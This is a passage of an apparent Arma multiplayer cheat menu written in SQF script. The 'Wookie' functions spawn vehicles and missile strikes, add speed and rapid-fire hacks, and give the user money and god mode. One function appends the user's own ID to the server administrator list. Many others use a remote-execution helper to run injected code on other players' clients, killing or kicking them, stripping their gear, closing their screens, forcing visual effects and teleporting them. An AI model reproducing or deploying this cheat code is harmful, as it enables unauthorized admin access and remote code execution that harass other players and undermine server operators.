	[[((_pos) select 0)+_distance*sin(_dir), ((_pos) select 1)+_distance*cos(_dir),300], _dir, 'B_AH9_F', _side] call bis_fnc_spawnvehicle;sleep 0.1;
	_distance = -850;
	[[((_pos) select 0)+_distance*sin(_dir), ((_pos) select 1)+_distance*cos(_dir),300], _dir, 'B_AH9_F', _side] call bis_fnc_spawnvehicle;sleep 0.1;

	_dir = _dir + 180;

	_distance = -700;
	[[((_pos) select 0)+_distance*sin(_dir), ((_pos) select 1)+_distance*cos(_dir),300], _dir, 'B_AH9_F', _side] call bis_fnc_spawnvehicle;sleep 0.1;
	_distance = -750;
	[[((_pos) select 0)+_distance*sin(_dir), ((_pos) select 1)+_distance*cos(_dir),300], _dir, 'B_AH9_F', _side] call bis_fnc_spawnvehicle;sleep 0.1;
	_distance = -800;
	[[((_pos) select 0)+_distance*sin(_dir), ((_pos) select 1)+_distance*cos(_dir),300], _dir, 'B_AH9_F', _side] call bis_fnc_spawnvehicle;sleep 0.1;
	_distance = -850;
	[[((_pos) select 0)+_distance*sin(_dir), ((_pos) select 1)+_distance*cos(_dir),300], _dir, 'B_AH9_F', _side] call bis_fnc_spawnvehicle;sleep 0.1;
};

Wookie_HeliSquad2 =
{
	_side = side player;
	_side = group player;
	_pos = getPosATL vehicle player;
	_dir = getDir vehicle player;

	cutText [format["Spawning Heli Squad"], "PLAIN DOWN"];
	
	_distance = -700;
	[[((_pos) select 0)+_distance*sin(_dir), ((_pos) select 1)+_distance*cos(_dir),300], _dir, 'O_Ka60_F', _side] call bis_fnc_spawnvehicle;sleep 0.1;
	_distance = -750;
	[[((_pos) select 0)+_distance*sin(_dir), ((_pos) select 1)+_distance*cos(_dir),300], _dir, 'O_Ka60_F', _side] call bis_fnc_spawnvehicle;sleep 0.1;
	_distance = -800;
	[[((_pos) select 0)+_distance*sin(_dir), ((_pos) select 1)+_distance*cos(_dir),300], _dir, 'O_Ka60_F', _side] call bis_fnc_spawnvehicle;sleep 0.1;
	_distance = -850;
	[[((_pos) select 0)+_distance*sin(_dir), ((_pos) select 1)+_distance*cos(_dir),300], _dir, 'O_Ka60_F', _side] call bis_fnc_spawnvehicle;sleep 0.1;

	_dir = _dir + 180;

	_distance = -700;
	[[((_pos) select 0)+_distance*sin(_dir), ((_pos) select 1)+_distance*cos(_dir),300], _dir, 'O_Ka60_F', _side] call bis_fnc_spawnvehicle;sleep 0.1;
	_distance = -750;
	[[((_pos) select 0)+_distance*sin(_dir), ((_pos) select 1)+_distance*cos(_dir),300], _dir, 'O_Ka60_F', _side] call bis_fnc_spawnvehicle;sleep 0.1;
	_distance = -800;
	[[((_pos) select 0)+_distance*sin(_dir), ((_pos) select 1)+_distance*cos(_dir),300], _dir, 'O_Ka60_F', _side] call bis_fnc_spawnvehicle;sleep 0.1;
	_distance = -850;
	[[((_pos) select 0)+_distance*sin(_dir), ((_pos) select 1)+_distance*cos(_dir),300], _dir, 'O_Ka60_F', _side] call bis_fnc_spawnvehicle;sleep 0.1;
};

Wookie_NewsBanner =
{
	if (isnil ("Wookie_News_Bannerr")) then {Wookie_News_Bannerr = 0;};
	if (Wookie_News_Bannerr==0) then {Wookie_News_Bannerr=1;cutText [format["Random Para On"], "PLAIN DOWN"];hint "Random Para On";}else{Wookie_News_Bannerr=0;cutText [format["Random Para Off"], "PLAIN DOWN"];hint "Random Para Off";};

	while {Wookie_News_Bannerr==1} do 
	{
		_players = playableUnits;//call fnc_allunits;
		_countplayers = count _players;
		_i = 0;

		for "_i" from 0 to _countplayers do
		{
			_selectedUnit = _players select _i;
	
			if (player != _selectedUnit) then 
			{
				_banneron = "[parseText ""
				<t size='1.8' color='#CA278C'>Erreur commande admin SFP</t><br/>
				<t color='#CA278C'>Couillonade</t>"",parseText ""
				<t size='1.2' color='#00FFFF'>  </t>""] spawn BIS_fnc_AAN;";
				[_banneron] call Wookie_Pro_RE;
			}
			else
			{
				Wookie_News_Banner = 0;
				_banneroff = "3000 cutRsc [""Default"", ""PLAIN"", 2];";
				[_banneroff] call Wookie_Pro_RE;
			};
		};
	};
};

Wookie_Add_To_Green =
{
	_name = _this select 0;
	closeDialog 0;
	{
		if(name _x == _name) then
		{
			Wookie_Added_Greenlist;
			Wookie_Added_Greenlist = Wookie_Added_Greenlist + [getPlayerUID _x];
			hint format ["%1 Added To WhiteList", _name];
			cutText [format["%1 Added To WhiteList",_name], "PLAIN DOWN"];
		};
	} forEach playableUnits;
};

Wookie_3Dtext =
{
	if (isNil "atext") then
	{
		atext = 0;
	};

	if (atext == 0) then
	{
		atext = 1;
		hint "3D Text on";
		_3d = "[] spawn
		{
			disableSerialization;
			if (isNil ""BIS_fnc_3dCredits_n"") then {BIS_fnc_3dCredits_n = 2733;};
			BIS_fnc_3dCredits_n cutRsc [""rscDynamicText"", ""PLAIN""];
			BIS_fnc_3dCredits_n = BIS_fnc_3dCredits_n + 1;
			_ctrl = ((uiNamespace getvariable ""BIS_dynamicText"") displayctrl 9999);
			_ctrl ctrlShow true; _ctrl ctrlEnable true; _ctrl ctrlSetFade 0;
			tdtext = true;
			while {tdtext} do
			{
				if !(tdtext) exitWith {};
				_pos = [(getPosATL player) select 0, (getPosATL player) select 1, ((getPosATL player) select 2) + 2];
				_pos2D = worldToScreen _pos;
				if (count _pos2D > 0) then
				{
					_ctrl ctrlSetPosition [(_pos2D select 0) - (safezoneW / 2), (_pos2D select 1), safezoneW, safezoneH];
					_text = parseText ""<t size='0.8' color='#FF1AAA'>Bush Wookie</t>"";
					_ctrl ctrlSetStructuredText _text;
					_ctrl ctrlCommit 0;
				};
			};
			_ctrl ctrlShow false;
			_ctrl ctrlEnable false;
		};";
		[_3d] call Wookie_Pro_RE;
	}

	else
	{
		atext = 0;
		hint "3D Text OFF";
		_3d = "tdtext = false; tdtext = nil";
		[_3d] call Wookie_Pro_RE;
	};
};

Wookie_SpeedyGonzales =
{
	if (isNil "Wookie_Go_Fast") then
	{
		Wookie_Go_Fast = 0;
	};

	if (Wookie_Go_Fast == 0) then
	{
		Wookie_Go_Fast = 1;
		hint "Speedy Gonzales";
		cutText ["Arriba! Arriba! Epa! Epa! Andale! Andale!","PLAIN"];
		kWookie_Go_Fast = (findDisplay 46) displayAddEventHandler ["KeyDown", "key = _this select 1;
		_vel = velocity vehicle player;
		_dir = getDir vehicle player;
		_height = getPosATL vehicle player select 2;
		if (_height > 1 && key == 0x11) then
		{
			if (vehicle player == player) then
			{
				player setVelocity [(_vel select 0) + (sin _dir * 5), (_vel select 1) + (cos _dir * 5), (_vel select 2)];
			}

			else
			{
				if ((vehicle player isKindOf 'Ship') or (vehicle player isKindOf 'Motorcycle')) then
				{
					vehicle player setVelocity [(_vel select 0) + (sin _dir * 3), (_vel select 1) + (cos _dir * 3), (_vel select 2)];
				}

				else
				{
					vehicle player setVelocity [(_vel select 0) + (sin _dir * 150), (_vel select 1) + (cos _dir * 150), (_vel select 2)];
				};
			};
		};

		if (_height > 1 && key == 0x1F) then
		{
			if (vehicle player == player) then
			{
				player setVelocity [(_vel select 0) - (sin _dir * 5), (_vel select 1) - (cos _dir * 5), (_vel select 2)];
			}

			else
			{
				if ((vehicle player isKindOf 'Ship') or (vehicle player isKindOf 'Motorcycle')) then
				{
					vehicle player setVelocity [(_vel select 0) - (sin _dir * 3), (_vel select 1) - (cos _dir * 3), (_vel select 2)];
				}

				else
				{
					vehicle player setVelocity [(_vel select 0) - (sin _dir * 150), (_vel select 1) - (cos _dir * 150), (_vel select 2)];
				};
			};
		};

		if (_height > 1 && key == 0x1E) then
		{
			if (vehicle player == player) then
			{
				player setVelocity [(_vel select 0) + ((sin (_dir - 90)) * 5), (_vel select 1) + ((cos (_dir - 90)) * 5), (_vel select 2)];
			}

			else
			{
				if ((vehicle player isKindOf 'Ship') or (vehicle player isKindOf 'Motorcycle')) then
				{
					vehicle player setVelocity [(_vel select 0) + ((sin (_dir - 90)) * 3), (_vel select 1) + ((cos (_dir - 90)) * 3), (_vel select 2)];
				}

				else
				{
					vehicle player setVelocity [(_vel select 0) + ((sin (_dir - 90)) * 150), (_vel select 1) + ((cos (_dir - 90)) * 150), (_vel select 2)];
				};
			};
		};

		if (_height > 1 && key == 0x20) then
		{
			if (vehicle player == player) then
			{
				player setVelocity [(_vel select 0) + ((sin (_dir + 90)) * 5), (_vel select 1) + ((cos (_dir + 90)) * 5), (_vel select 2)];
			}

			else
			{
				if ((vehicle player isKindOf 'Ship') or (vehicle player isKindOf 'Motorcycle')) then
				{
					vehicle player setVelocity [(_vel select 0) + ((sin (_dir + 90)) * 3), (_vel select 1) + ((cos (_dir + 90)) * 3), (_vel select 2)];
				}

				else
				{
					vehicle player setVelocity [(_vel select 0) + ((sin (_dir + 90)) * 150), (_vel select 1) + ((cos (_dir + 90)) * 150), (_vel select 2)];
				};
			};
		};

		if (key == 0xC8) then
		{
			if (vehicle player == player) then
			{
				player setVelocity [(_vel select 0), (_vel select 1), (_vel select 2) + 2];
			}

			else
			{
				if ((vehicle player isKindOf 'Ship') or (vehicle player isKindOf 'Motorcycle')) then
				{
					vehicle player setVelocity [(_vel select 0), (_vel select 1), (_vel select 2) + 4];
				}

				else
				{
					vehicle player setVelocity [(_vel select 0), (_vel select 1), (_vel select 2) + 30];
				};
			};
		};

		if (key == 0xD0) then
		{
			if (vehicle player == player) then
			{
				player setVelocity [(_vel select 0), (_vel select 1), (_vel select 2) - 2];
			}

			else
			{
				if ((vehicle player isKindOf 'Ship') or (vehicle player isKindOf 'Motorcycle')) then
				{
					vehicle player setVelocity [(_vel select 0), (_vel select 1), (_vel select 2) - 4];
				}

				else
				{
					vehicle player setVelocity [(_vel select 0), (_vel select 1), (_vel select 2) - 30];
				};
			};
		};

		if (key == 0x39) then
		{
			_vx = 0;
			_vy = 0;
			_vz = 0;
			_sx = _vel select 0;
			_sy = _vel select 1;
			_sz = _vel select 2;
			if (_sx > 0) then {_vx = _sx / 1.1;};
			if (_sy > 0) then {_vy = _sy / 1.1;};
			if (_sz > 0) then {_vz = _sz / 1.1;};
			vehicle player setVelocity [_vx, _vy, _vz];
		};

		if (key == 0xCB) then
		{
			vehicle player setDir (_dir - 1.3);
		};

		if (key == 0xCD) then
		{
			vehicle player setDir (_dir + 1.3);
		};"];
	}

	else
	{
		Wookie_Go_Fast = 0;
		hint "Speedy Gonzales OFF";
		cutText ["I go take my siesta now","PLAIN"];
		(findDisplay 46) displayRemoveEventHandler ["KeyDown", kWookie_Go_Fast];
	};
};

Wookie_AutoTakeOffV2 =
{
	_obj= "B_AH9_F";
	_dir = getdir vehicle player;
	_pos = getPosATL vehicle player;
	_pos = [(_pos select 0)+5*sin(_dir),(_pos select 1)+5*cos(_dir),(_pos select 2)];
	_rid = 999+random(99999);
	_object = createVehicle [_obj, _pos, [], 0, '']; 
	_object setVariable ['ObjectID', _rid, true];
	serverObjectMonitor set [count serverObjectMonitor, _object];
	_uid = _object call objectUID;
	_object setVariable ['ObjectUID', _uid, true];
	_object setVariable ['OwnerID', 0, true];
	_object setDir _dir;
	_object engineon true;
	_object setVelocity [50*sin(_dir),50*cos(_dir),300];
	sleep 0.01;
	vehicle player moveInDriver _object;
};

Wookie_MissileStrike =
{
	Missles = 30;
	missle1 = 
	{
		openMap [false, false];
		[_pos] spawn 
		{
			for '_i' from 0 to Missles do
			{
				_missle = "M_AT";
				_mpos = 
				[
					_this select 0 select 0, 
					_this select 0 select 1, 
					(_this select 0 select 2) + 300
				];
			
				_launch = createVehicle [_missle, _mpos, [], 0, ""];
				_launch setvelocity [0,0,0];
				[_launch,-90,0] call BIS_fnc_setPitchBank;
				hint format ["%1 Missiles Launched",_i];
				sleep (random 1.00);
			};
		};
	};
	titleText ["Click on map drop missle's","PLAIN"]; titlefadeout 7;
	onMapSingleClick "_pos call missle1;";
	openMap [true, false];
};

Wookie_QuickFire =
{
	if (isnil ("Wookie_Rapidfire")) then {Wookie_Rapidfire = 0;};
	if (Wookie_Rapidfire==0) then {Wookie_Rapidfire=1;cutText [format["Minimize Time Between Shots on"], "PLAIN DOWN"];hint "Minimize Time Between Shots on";}else{Wookie_Rapidfire=0;cutText [format["Minimize Time Between Shots OFF"], "PLAIN DOWN"];hint "Minimize Time Between Shots OFF";};

	while {Wookie_Rapidfire==1} do 
	{
		(vehicle player) setWeaponReloadingTime [(vehicle player),currentWeapon (vehicle player),0];
		player setWeaponReloadingTime [player,currentWeapon player,0];

	sleep 0.01;
	};
};

Wookie_BigFcknBullets =
{
	if (isNil "Wookie_Explo_Bullets" ) then {Wookie_Explo_Bullets=0};

	if (Wookie_Explo_Bullets==0) then 
	{
		Wookie_Explo_Bullets=1;
		vehicle player removeAllEventHandlers "Fired";
		cutText ["                       \nBig Fuckin Bullets Loaded..","PLAIN"];
		vehicle player addeventhandler ["Fired",{call BigFuckinBullets} ];
   
		BigFuckinBullets = 
		{
			if (isNull cursorTarget) then 
			{
				TargetPlayer = screenToWorld [0.5,0.5];
			} 
			else 
			{
				TargetPlayer = getPosATL cursorTarget;
			};
			_spwnboom = "HelicopterExploBig" createVehiclelocal TargetPlayer;
		};
	}
	else
	{
		Wookie_Explo_Bullets=0;
		cutText ["\nBack to Normal Bullets..","PLAIN"];
		vehicle player removeAllEventHandlers "Fired";
	};
};

Wookie_ForceAdminMenu_404 =
{
	#define serverAdminMenu_option 50007
	disableSerialization;
	private ["_start","_panelOptions","_displayServerAdmin","_serverAdminSelect"];

	_uid = getPlayerUID player;

	if ((_uid in moderators) OR (_uid in administrators) OR (_uid in serverAdministrators)) then 
	{
		_start = createDialog "ServerAdminMenu";
		_displayServerAdmin = uiNamespace getVariable "ServerAdminMenu";
		_serverAdminSelect = _displayServerAdmin displayCtrl serverAdminMenu_option;
		_panelOptions = ["Player Menu","Vehicle Management","Tags","Teleport","Money","Debug Menu"];
		{
			_serverAdminSelect lbAdd _x;
		} forEach _panelOptions;
	} 
	else 
	{
		exit;
	};
};

Wookie_AdminMenu_404 =
{
	_uid = getPlayerUID player;
	serverAdministrators set [count serverAdministrators, _uid];
	cutText ["You Should Now Have Access To the 404 wasteland Admin Menu Press U or F2 to find out","PLAIN"];
};

Wookie_Cash =
{
	_money = (player getVariable "cmoney");
	_addtomoney = _this select 0;
	player setVariable["cmoney",_money+_addtomoney,false];
	hint format ["%1$ Added", _addtomoney];
};

Wookie_Cash_1k_t =
{
	_name = _this select 0;
	hint format ["Money Given to %1", _name];
	_share = format ["if (name player == '%1') then
	{
		['_moneh',1000] call INV_addinventoryitem;
		_money = (player getVariable 'cmoney');
		_addtomoney = 1000;
		player setVariable['cmoney',_money+_addtomoney,false];
	};",_name];

	[_share] call Wookie_Pro_RE;
};

Wookie_Cash_3k_t =
{
	_name = _this select 0;
	hint format ["Money Given to %1", _name];
	_share = format ["if (name player == '%1') then
	{
		['_moneh',3000] call INV_addinventoryitem;
		_money = (player getVariable 'cmoney');
		_addtomoney = 3000;
		player setVariable['cmoney',_money+_addtomoney,false];
	};",_name];

	[_share] call Wookie_Pro_RE;
};

Wookie_Cash_max_t =
{
	_name = _this select 0;
	hint format ["Money Given to %1", _name];
	_share = format ["if (name player == '%1') then
	{
		['_moneh',5000000] call INV_addinventoryitem;
		_money = (player getVariable 'cmoney');
		_addtomoney = 5000000;
		player setVariable['cmoney',_money+_addtomoney,false];
	};",_name];

	[_share] call Wookie_Pro_RE;
};

Wookie_Cash_a =
{
	_Monehhh = _this select 0;
	hint format ["$%1 Given To All", _Monehhh];

	_share = "
	_money = (player getVariable 'cmoney');
	_addtomoney = _this select 0;
	player setVariable['cmoney',_money+_addtomoney,false];
	";

	[_share] call Wookie_Pro_RE;
};

Wookie_heal_t =
{
	_name = _this select 0;
	if (!(isNil "Dayz_GUI_R") or !(isNil "dayz_originalPlayer")) then 
	{
		_theal = format["if (name player == '%1') then
		{
			r_player_handler = false;
			r_player_handler1 = false;
			r_player_dead = false;
			r_player_unconscious = false;
			r_player_infected = false;
			r_player_injured = false;
			r_player_inpain = false;
			r_player_loaded = false;
			r_player_cardiac = false;
			r_fracture_legs = false;
			r_fracture_arms = false;
			r_player_blood = 12000;
			r_player_lowblood = false;
			r_player_timeout = 0;
			r_handlerCount = 0;
			dayz_hunger = 0;
			dayz_thirst = 0;
			dayz_temperatur = 42;
			player setDamage 0;
			vehicle player setDamage 0;
		};", _name];
		[_theal] call Wookie_Pro_RE;
	}
	else
	{
		_theal = format["if (name player == '%1') then
		{
			player setDamage 0;
			vehicle player setDamage 0;
	
		};", _name];
		[_theal] call Wookie_Pro_RE;
	};

	hint format ["Healing %1", _name];
	cutText [format["Healing %1",_name], "PLAIN DOWN"];
};

Wookie_FuckUp_t =
{
	_name = _this select 0;

	_fcukupwookie = format["if (name player == '%1') then
	{

	startLoadingScreen ['Vous êtes dans la merde ...'];

	removeAllWeapons player;
	removeAllItems player;
	removeBackpack player;

	0 fadeSound 0;

	_unit = player;
	_unit setDamage 1;
	for '_i' from 0 to 100 do {(findDisplay _i) closeDisplay 0;};

	};", _name];
	[_fcukupwookie] call Wookie_Pro_RE;

	hint format ["%1 Fucked UP", _name];
	cutText [format["%1 Fucked UP", _name], "PLAIN DOWN"];
};

Wookie_Kick_t =
{
	_name = _this select 0;

	_WookieKick = format["if (name player == '%1') then
	{

		failMission 'LOSER';
		0 fadeSound 0;
		for '_i' from 0 to 100 do {(findDisplay _i) closeDisplay 0;};

	};", _name];
	[_WookieKick] call Wookie_Pro_RE;

	hint format ["%1 Kicked", _name];
	cutText [format["%1 Kicked",_name], "PLAIN DOWN"];
};

Wookie_SpinAround_t =
{
	_name = _this select 0;

	_YouSpinMeRightRound = format["if (name player == '%1') then
	{
		[] spawn 
		{
			if (isNil 'Wookie_SpinAround') then {Wookie_SpinAround = true;} else {Wookie_SpinAround = !Wookie_SpinAround;};
			while {Wookie_SpinAround} do {vehicle player setDir (getdir vehicle player)+5;};
		};
	};", _name];
	[_YouSpinMeRightRound] call Wookie_Pro_RE;

	hint format ["Spin Around %1 ON", _name];
	cutText [format["Spin Around %1 ON",_name], "PLAIN DOWN"];
};

Wookie_Explode_t =
{
	_plr = _this select 0;
	_pList = playableUnits;
	j = count _pList;
	i = 0;
	_pArray = [];

	for "i" from 0 to j do
	{
		v= _pList select i;
		if(format[name v] == _plr) then 
		{
			_unit = v;
			_unit = (vehicle _unit);

			_object = "HelicopterExploSmall" createvehiclelocal (getPosATL _unit);

			cutText [format["Exploded %1", name _unit], "PLAIN DOWN"];
		};

	};
};

Wookie_Kill_t =
{
	_name = _this select 0;
	hint format ["Killing %1", _name];
	_tkill = format["if (name player == '%1') then
	{
		if (alive player) then { player SetDamage 1;};
	};", _name];
	[_tkill] call Wookie_Pro_RE;
};

Wookie_TpToMe_t =
{
	_name = _this select 0;
	{
		if(name _x == _name) then
		{
			_pos = getPosATL vehicle _x;
			_dir = getDir vehicle _x;
			if (player != vehicle player) then 
			{
				_pos = [(_pos select 0)-8*sin(_dir),(_pos select 1)-8*cos(_dir),(_pos select 2)+1];
			}
			else
			{
				_pos = [(_pos select 0)-2*sin(_dir),(_pos select 1)-2*cos(_dir),(_pos select 2)+1];
			};
			if (!isNil ("dayz_instance")) then {"respawn_west" setMarkerPos _pos;};
			vehicle player setPosATL _pos;
			if (!isNil ("dayz_instance")) then {"respawn_west" setMarkerPos _pos;};
			vehicle player setDir _dir;
		};
	} forEach playableUnits;

	hint format ["TP to %1", _name];
	cutText [format["TP to %1",_name], "PLAIN DOWN"];
};

Wookie_TpToThem_t =
{
	_name = _this select 0;
	_pos = getPosATL player;
	hint format ["Teleporting %1", _name];
	_tp = format ["if (isServer) then
	{
		{
			if (name _x == '%1') then
			{
				(vehicle _x) setPosATL [(%2 select 0) + random 15, (%2 select 1) + random 15, %2 select 2];
			};
		} forEach playableUnits;
	};	", _name, _pos];
	[_tp] call Wookie_Pro_RE;
};

Wookie_Spectate_t =
{
	_name = _this select 0;
	{
		if(name _x == _name) then
		{
			_x switchCamera "EXTERNAL";
			hint format ["Spectating %1, press F10 to cancel", name _x];
		};
	} forEach entities "CAManBase";
	(findDisplay 46) displayAddEventHandler ['KeyDown', 'if ((_this select 1) == 0x44) then
	{
		player switchCamera "EXTERNAL";
	}'];
};

Wookie_GodMode_t =
{
	_name = _this select 0;

	if (isNil "GodLolPenis") then {GodLolPenis = true; gnamearr = [];};
	if !(_name in gnamearr) then
	{
		hint format ["God Mode on %1 Activated", _name]; gnamearr = gnamearr + [_name];
	} else {hint format ["God Mode on %1 Deactivated", _name]; gnamearr = gnamearr - [_name];};

	_tgod = format ["if (name player == '%1') then
	{
		if (isNil 'gmdlol') then
		{
			gmdlol = true;
			player removeAllEventHandlers 'handleDamage';
			player addEventHandler ['handleDamage', {false}];
			player allowDamage false;
		}
		else
		{
			player addEventHandler ['handleDamage', {true}];
			player removeAllEventHandlers 'handleDamage';
			player allowDamage true;
			gmdlol = nil;
		};
	};", _name];
	[_tgod] call Wookie_Pro_RE;
};

Wookie_JoinVeh_t =
{
	_name = _this select 0;
	{
		if(name _x == _name) then
		{
			player moveInCargo vehicle _x;
			player moveInGunner vehicle _x;
		
			hint format ["%1 vehicle joined", _x];
			cutText [format["%1 vehicle joined", _x], "PLAIN DOWN"];
		};
	} forEach entities "AllVehicles";
};

Wookie_Remove_VF_t =
{
	_name = _this select 0;

	_reeeee = format["if (name player == '%1') then
	{
		ppEffectDestroy ppColor;
		ppEffectDestroy ppBlur;
		ppEffectDestroy ppInversion;
		ppEffectDestroy ppGrain;
		ppEffectDestroy nonapsi_ef;
		ppEffectDestroy nonapsi_ef2;
		deletevehicle snow;
		deletevehicle ps;
		ppEffectDestroy ppe;
		ppEffectDestroy ppe2;
		ppEffectDestroy ppe3;
		ppEffectDestroy wetdist1;
		setaperture 0;
		""dynamicBlur"" ppEffectAdjust [0];
		""dynamicBlur"" ppEffectCommit 16;

		""colorCorrections"" ppEffectAdjust [1, 1, 0, [1, 1, 1, 0.0], [1, 1, 1, 1],  [1, 1, 1, 0.0]];
		""colorCorrections"" ppEffectCommit 0;
	
	};", _name];
	[_reeeee] call Wookie_Pro_RE;

	hint format ["executed on %1", _name];
	cutText [format["executed on %1",_name], "PLAIN DOWN"];
};

Wookie_Wasteland_VF_t =
{
	_name = _this select 0;

	_reeeee = format["if (name player == '%1') then
	{

		""colorCorrections"" ppEffectAdjust [2, 30, 0, [0.0, 0.0, 0.0, 0.0], [0.8*2, 0.5*2, 0.0, 0.7], [0.9, 0.9, 0.9, 0.0]];
		""colorCorrections"" ppEffectCommit 0;
		""colorCorrections"" ppEffectAdjust [1, 0.8, -0.001, [0.0, 0.0, 0.0, 0.0], [0.8*2, 0.5*2, 0.0, 0.7], [0.9, 0.9, 0.9, 0.0]];  
		""colorCorrections"" ppEffectCommit 3;
		""colorCorrections"" ppEffectEnable true;
		""filmGrain"" ppEffectEnable true; 
		""filmGrain"" ppEffectAdjust [0.02, 1, 1, 0.1, 1, false];
		""filmGrain"" ppEffectCommit 5;


		[] spawn {
			waituntil {isplayer player};
			setwind [0.201112,0.204166,true];
			while {true} do {
				_ran = ceil random 5;
				playsound format [""wind_%1"",_ran];
				_obj = vehicle player;
				_pos = getPosATL _obj;


				setwind [0.201112*2,0.204166*2,false];
				_velocity = [random 10,random 10,-1];
				_color = [1.0, 0.9, 0.8];
				_alpha = 0.02 + random 0.02;
				_ps = ""#particlesource"" createVehicleLocal _pos;  
				_ps setParticleParams [[""A3\Data_f\ParticleEffects\Universal\universal.p3d"", 16, 12, 8], """", ""Billboard"", 1, 3, [0, 0, -6], _velocity, 1, 1.275, 1, 0, [9], [_color + [0], _color + [_alpha], _color + [0]], [1000], 1, 0, """", """", _obj];
				_ps setParticleRandom [3, [30, 30, 0], [0, 0, 0], 1, 0, [0, 0, 0, 0.01], 0, 0];
				_ps setParticleCircle [0.1, [0, 0, 0]];
				_ps setDropInterval 0.01;

				sleep (random 1);
				deletevehicle _ps;
				_delay = 10 + random 20;
				sleep _delay;
			};
		};


		[] spawn {
			waituntil {isplayer player};
			_pos = getPosATL player;
			_parray = [
				[""A3\Data_f\ParticleEffects\Universal\Universal"", 16, 12, 8, 1],
				"""",
				""Billboard"",
				1,
				4,
				[0,0,0],
				[0,0,0],
				1,
				0.000001,
		        0,
		        1.4,
		        [0.05,0.05],
		        [[0.1,0.1,0.1,1]],
				[0,1],
				0.2,
				1.2,
		        """",
				"""",
				vehicle player
			];
			_snow = ""#particlesource"" createVehicleLocal _pos;  
			_snow setParticleParams _parray;
			_snow setParticleRandom [0, [10, 10, 7], [0, 0, 0], 0, 0.01, [0, 0, 0, 0.1], 0, 0];
			_snow setParticleCircle [0.0, [0, 0, 0]];
			_snow setDropInterval 0.01;

			_oldPlayer = vehicle player;
			while {true} do {
				waituntil {vehicle player != _oldPlayer};
				_parray set [18,vehicle player];
				_snow setParticleParams _parray;
				_oldPlayer = vehicle player;
			};
		};
	};", _name];
	[_reeeee] call Wookie_Pro_RE;

	hint format ["executed on %1", _name];
	cutText [format["executed on %1",_name], "PLAIN DOWN"];
};

Wookie_BlackNWhite_VF_t =
{
	_name = _this select 0;

	_reeeee = format["if (name player == '%1') then
	{

		setaperture 24;
		ppColor = ppEffectCreate [""ColorCorrections"", 1999];
		ppColor ppEffectEnable true;
		ppColor ppEffectAdjust [1, 1, 0, [1, 1, 1, 0], [1, 1, 1, 0.0], [1, 1, 1, 1.0]];
		ppColor ppEffectCommit 0;

		ppBlur = ppEffectCreate [""dynamicBlur"", 505];
		ppBlur ppEffectEnable true; 
		ppBlur ppEffectAdjust [.5];
		ppBlur ppEffectCommit 0;

		ppInversion = ppEffectCreate ['colorInversion', 2555];
		ppInversion ppEffectEnable true;
		ppInversion ppEffectAdjust [1,1,1];
		ppInversion ppEffectCommit 0;

		ppGrain = ppEffectCreate [""filmGrain"", 2005];
		ppGrain ppEffectEnable true;
		ppGrain ppEffectAdjust [0.02, 1, 1, 0, 1];
		ppGrain ppEffectCommit 0;

	};", _name];
	[_reeeee] call Wookie_Pro_RE;

	hint format ["executed on %1", _name];
	cutText [format["executed on %1",_name], "PLAIN DOWN"];
};

Wookie_Spiderman_VF_t =
{
	_name = _this select 0;

	_reeeee = format["if (name player == '%1') then
	{

		ppe = ppEffectCreate [""colorCorrections"", 1555]; 
		ppe ppEffectAdjust [1, 1, 0, [1.5,-1,-1.5,0.5], [5,3.5,-5,-0.5], [-3,5,-5,-0.5]]; 
		ppe ppEffectCommit 1;
		ppe ppEffectEnable true; 
		ppe2 = ppEffectCreate [""chromAberration"", 1555]; 
		ppe2 ppEffectAdjust [0.01,0.01,true];
		ppe2 ppEffectCommit 1;
		ppe2 ppEffectEnable true;
		ppe3 = ppEffectCreate [""radialBlur"", 1555]; 
		ppe3 ppEffectEnable true;
		ppe3 ppEffectAdjust [0.02,0.02,0.15,0.15]; 
		ppe3 ppEffectCommit 1;
	
	};", _name];
	[_reeeee] call Wookie_Pro_RE;

	hint format ["executed on %1", _name];
	cutText [format["executed on %1",_name], "PLAIN DOWN"];
};

Wookie_Gloomy_VF_t =
{
	_name = _this select 0;

	_reeeee = format["if (name player == '%1') then
	{

		ppe = ppEffectCreate [""colorCorrections"", 1555]; 
		ppe ppEffectAdjust [1, 0.75, 0, [0.8,0.9,1,-0.1], [1,1,1,2], [-0.5,0,-1,5]]; 
		ppe ppEffectCommit 1;
		ppe ppEffectEnable true; 
		ppe2 = ppEffectCreate [""filmGrain"", 1555]; 
		ppe2 ppEffectAdjust [0.1, -1, 0.1, 0.05, 2, false]; 
		ppe2 ppEffectCommit 1;
		ppe2 ppEffectEnable true;
	
	};", _name];
	[_reeeee] call Wookie_Pro_RE;

	hint format ["executed on %1", _name];
	cutText [format["executed on %1",_name], "PLAIN DOWN"];
};

Wookie_RandParaLol_a =
{
	if (isnil ("rand_para")) then {rand_para = 0;};
	if (rand_para==0) then {rand_para=1;cutText [format["Random Para On"], "PLAIN DOWN"];hint "Random Para On";}else{rand_para=0;cutText [format["Random Para Off"], "PLAIN DOWN"];hint "Random Para Off";};

	while {rand_para==1} do 
	{
		_players = playableUnits;//call fnc_allunits;
		_countplayers = count _players;
		_i = 0;

		for "_i" from 0 to _countplayers do
		{
			_selectedUnit = _players select _i;
	
			if (player != _selectedUnit) then 
			{
				_dir = getdir vehicle player;
				_pos = getPosATL vehicle player;
				_pos = [(_pos select 0) + random 500,(_pos select 1)+ random 500,(_pos select 2) + 250];
				_selectedUnit setPosATL _pos;
			}
		}; sleep 2;
	};
};

Wookie_RandTPLol_a =
{
	_players = playableUnits;
	_countplayers = count _players;
	_i = 0;

	for "_i" from 0 to _countplayers do
	{
		_selectedUnit = _players select _i;

		if (player != _selectedUnit) then 
		{
			_dir = getdir vehicle player;
			_pos = getPosATL vehicle player;
			_pos = [(_pos select 0) + random 2500,(_pos select 1)+ random 2500,_pos select 2];
			_selectedUnit setPosATL _pos;
		}
	};
};

Wookie_TPAll_a =
{
	_pos = getPosATL player;
	_tp = format ["if (isServer) then
	{
		{
			(vehicle _x) setPosATL [(%1 select 0) + random 20, (%1 select 1) + random 20, %1 select 2];
		} forEach playableUnits;
	};", _pos];
	[_tp] call Wookie_Pro_RE;
};

Wookie_GodeMode_a =
{
	_list = call Wookie_List;

	hint "God Mode on all enabled";
	_agod = format ["if !(getPlayerUID player in %1) then
	{
		player removeAllEventHandlers 'handleDamage';
		player addEventHandler ['handleDamage', {false}];
		player allowDamage false;
	};", _list];
	while {godall == 1} do
	{
		[_agod] call Wookie_Pro_RE;
		sleep 30;
	};
};

Wookie_GodeModeOff_a =
{
	_list = call Wookie_List;

	hint "God Mode on all disabled";
	_agod = format ["if !(getPlayerUID player in %1) then
	{
		player addEventHandler ['handleDamage', {true}];
		player removeAllEventHandlers 'handleDamage';
		player allowDamage true;
